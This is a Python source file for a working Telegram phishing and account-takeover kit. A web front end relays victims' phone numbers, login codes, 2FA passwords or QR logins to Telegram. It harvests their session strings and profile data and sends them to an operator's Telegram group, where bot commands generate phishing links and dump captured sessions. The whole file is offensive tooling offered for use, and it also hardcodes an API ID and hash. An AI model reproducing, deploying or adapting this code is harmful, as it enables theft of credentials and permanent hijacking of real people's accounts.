import os
import asyncio
import telebot
import qrcode
import base64
from io import BytesIO
from quart import Quart, request, render_template, jsonify
from telethon import TelegramClient, errors, functions, types
from telethon.sessions import StringSession
from threading import Thread

# --- CONFIGURATION ---
# These are pulled safely from your Koyeb Environment Variables
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
BASE_URL = os.environ.get("BASE_URL", "https://your-app.koyeb.app")

# Ensure GROUP_ID is a proper integer starting with -100
try:
    raw_group_id = os.environ.get("GROUP_ID", "0")
    GROUP_ID = int(raw_group_id)
except ValueError:
    GROUP_ID = 0

bot = telebot.TeleBot(BOT_TOKEN)
app = Quart(__name__)

# Global storage for sessions and target data
active_relays = {} 
captured_list = [] 

# --- DATA SCRAPING UTILITY ---
async def scrape_full_data(client, phone):
    """Gathers premium status, bio, and session string."""
    try:
        me = await client.get_me()
        full_user = await client(functions.users.GetFullUserRequest(id=me.id))
        session_str = client.session.save()
        
        data = {
            "name": f"{me.first_name} {me.last_name or ''}".strip(),
            "id": me.id,
            "username": f"@{me.username}" if me.username else "None",
            "bio": full_user.full_user.about or "No Bio",
            "premium": "✅ Yes" if me.premium else "❌ No",
            "session": session_str,
            "phone": phone
        }
        return data
    except Exception as e:
        print(f"Scrape Error: {e}")
        return None

# --- BOT COMMANDS (VinzyStore UI) ---

@bot.message_handler(commands=['start', 'help'])
@bot.message_handler(func=lambda m: m.text == '.help')
def send_help(m):
    # Only respond in your private group
    if m.chat.id != GROUP_ID: return
    
    help_text = (
        "👑 <b>VinzyStore Relay - Expert Guide</b>\n\n"
        "<b>Commands:</b>\n"
        "• <code>.help</code> - Show this menu\n"
        "• <code>.link [id]</code> - Create a unique phishing link\n"
        "• <code>.list</code> - List all captured phone numbers\n"
        "• <code>.profile [phone]</code> - Full data dump of target\n"
        "• <code>.info</code> - Server health & stats\n\n"
        "<b>Benefits:</b>\n"
        "✅ Bypasses 2FA | ✅ Permanent Access | ✅ Real-time"
    )
    bot.reply_to(m, help_text, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == '.list')
def handle_list(m):
    if m.chat.id != GROUP_ID: return
    if not captured_list:
        return bot.reply_to(m, "⚠️ <b>Database is empty.</b>", parse_mode="HTML")
    
    msg = f"📋 <b>Total Hits: {len(captured_list)}</b>\n\n"
    for num in captured_list:
        name = active_relays.get(num, {}).get('info', {}).get('name', 'User')
        msg += f"👤 {name} -> <code>{num}</code>\n"
    bot.reply_to(m, msg, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.link'))
def create_link(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(' ')
    yt_id = parts[1] if len(parts) > 1 else "default"
    
    # URL generated using your Koyeb URL and the Group ID
    phish_url = f"{BASE_URL.rstrip('/')}/?id={GROUP_ID}&ytid={yt_id}"
    
    response = (
        "🔗 <b>New Relay Link Generated</b>\n"
        "━━━━━━━━━━━━━━━\n"
        f"🌐 <b>URL:</b> <code>{phish_url}</code>\n"
        f"📺 <b>Targeting:</b> <code>{yt_id}</code>\n"
        "━━━━━━━━━━━━━━━\n"
        "⚠️ <i>Send this to the target. All logs appear here.</i>"
    )
    bot.reply_to(m, response, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.profile'))
def profile_lookup(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(' ')
    if len(parts) < 2: return bot.reply_to(m, "❌ Use: <code>.profile [phone]</code>")
    
    target = parts[1]
    if target in active_relays and "info" in active_relays[target]:
        info = active_relays[target]['info']
        msg = (
            f"💎 <b>FULL DATA DUMP</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"👤 <b>Name:</b> {info['name']}\n"
            f"🆔 <b>ID:</b> <code>{info['id']}</code>\n"
            f"🏷️ <b>User:</b> {info['username']}\n"
            f"🌟 <b>Premium:</b> {info['premium']}\n"
            f"📖 <b>Bio:</b> {info['bio']}\n"
            f"━━━━━━━━━━━━━━━\n"
            f"🔑 <b>SESSION:</b>\n<code>{info['session']}</code>"
        )
        bot.reply_to(m, msg, parse_mode="HTML")
    else:
        bot.reply_to(m, "❌ Target data not found in memory.")

@bot.message_handler(func=lambda m: m.text == '.info')
def server_info(m):
    if m.chat.id != GROUP_ID: return
    status = (
        "⚙️ <b>Server Health & Stats</b>\n"
        "━━━━━━━━━━━━━━━\n"
        "🚀 <b>Status:</b> Online\n"
        f"📡 <b>Active Sessions:</b> {len(active_relays)}\n"
        f"📈 <b>Database Hits:</b> {len(captured_list)}\n"
        "━━━━━━━━━━━━━━━"
    )
    bot.reply_to(m, status, parse_mode="HTML")

# --- WEB ROUTES ---

@app.route('/')
async def index():
    # If no ID is in URL, default to your private group
    tid = request.args.get('id', str(GROUP_ID))
    return await render_template('login.html', tid=tid)

@app.route('/get_qr', methods=['POST'])
async def get_qr():
    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
    await client.connect()
    try:
        qr_login = await client.qr_login()
        img = qrcode.make(qr_login.url)
        buf = BytesIO()
        img.save(buf, format="PNG")
        img_str = base64.b64encode(buf.getvalue()).decode()
        
        active_relays["qr_temp"] = {"client": client}
        return jsonify({"status": "success", "qr_image": img_str})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    data = await request.json
    phone, tid = data.get('phone'), data.get('tid')
    
    # Validation to prevent "Chat not found"
    target_chat = tid if tid and tid != "Admin" else GROUP_ID
    
    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        active_relays[phone] = {"client": client, "hash": sent_code.phone_code_hash}
        
        bot.send_message(target_chat, f"🎯 <b>Target Input Phone:</b>\n<code>{phone}</code>", parse_mode="HTML")
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_code', methods=['POST'])
async def step_code():
    data = await request.json
    phone, code, tid = data.get('phone'), data.get('code'), data.get('tid')
    target_chat = tid if tid and tid != "Admin" else GROUP_ID
    
    if phone not in active_relays: return jsonify({"status": "error", "msg": "Session Expired"})
    
    client = active_relays[phone]["client"]
    try:
        await client.sign_in(phone, code, phone_code_hash=active_relays[phone]["hash"])
        user_data = await scrape_full_data(client, phone)
        
        if user_data:
            active_relays[phone]["info"] = user_data
            if phone not in captured_list: captured_list.append(phone)
            
            log = (
                f"💰 <b>LOGIN SUCCESS!</b>\n"
                f"👤 <b>User:</b> {user_data['name']}\n"
                f"📱 <b>Phone:</b> <code>{phone}</code>\n"
                f"🔑 <b>String:</b> <code>{user_data['session']}</code>"
            )
            bot.send_message(target_chat, log, parse_mode="HTML")
        
        return jsonify({"status": "success"})
        
    except errors.SessionPasswordNeededError:
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_2fa', methods=['POST'])
async def step_2fa():
    data = await request.json
    phone, password, tid = data.get('phone'), data.get('password'), data.get('tid')
    target_chat = tid if tid and tid != "Admin" else GROUP_ID
    
    if phone not in active_relays: return jsonify({"status": "error", "msg": "Session Expired"})
    
    client = active_relays[phone]["client"]
    try:
        await client.sign_in(password=password)
        user_data = await scrape_full_data(client, phone)
        
        if user_data:
            active_relays[phone]["info"] = user_data
            log = (
                f"🔓 <b>2FA BYPASSED!</b>\n"
                f"👤 <b>User:</b> {user_data['name']}\n"
                f"🔑 <b>String:</b> <code>{user_data['session']}</code>"
            )
            bot.send_message(target_chat, log, parse_mode="HTML")
            
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

# --- RUNNER ---
def start_bot():
    print(f"Bot started. Authorized Group: {GROUP_ID}")
    bot.infinity_polling()

if __name__ == "__main__":
    Thread(target=start_bot).start()
    # Quart uses port 8000 for local, Koyeb will map it to 80/443
    app.run(host="0.0.0.0", port=8000)
